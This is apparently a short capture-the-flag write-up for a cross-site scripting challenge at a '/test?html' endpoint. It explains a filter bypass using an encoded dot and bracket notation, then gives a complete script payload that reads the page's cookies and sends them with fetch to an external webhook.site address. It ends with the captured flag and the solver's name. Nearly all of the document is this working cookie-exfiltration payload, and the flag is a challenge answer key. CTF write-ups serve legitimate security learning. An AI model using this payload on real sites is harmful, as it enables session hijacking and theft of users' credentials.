# Solution
XSS at `/test?html`

Bypass dot character with `%2f` in URL and `document['cookie']`

```
test?html=<script>s=document['cookie'];fetch(`https://webhook%2esite/887722a2-39e8-4ac2-869e-64489b72347d/${s}`)</script>
```

Flag: `ping{cH4r53tt1ng_l1k3-4-Pr0-f211c8998abab934e26d4c2164dc5388}`


Solved by: benkyou 
